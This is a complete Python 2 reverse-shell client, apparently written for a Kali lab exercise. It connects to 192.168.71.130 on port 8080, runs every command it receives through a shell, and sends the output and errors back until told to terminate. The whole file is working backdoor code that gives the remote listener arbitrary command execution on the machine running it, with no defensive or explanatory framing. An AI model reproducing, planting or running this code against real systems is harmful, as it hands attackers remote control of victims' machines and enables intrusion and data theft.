# Client

import socket   # For Bulding TCP Connection
import subprocess   # To start the shell in the system

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.71.130', 8080))

    while True: # Keep receiving command from the Kali Machine
        command = s.recv(1024)

        if 'terminate' in command:
            s.close()
            break   # Close the socket
        else:
            CMD = subprocess.Popen(command, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            s.send( CMD.stdout.read() )  # send the result
            s.send( CMD.stderr.read() ) # in case you mistyped a command,
                                   #we will send back the error

def main():
    connect()
main()
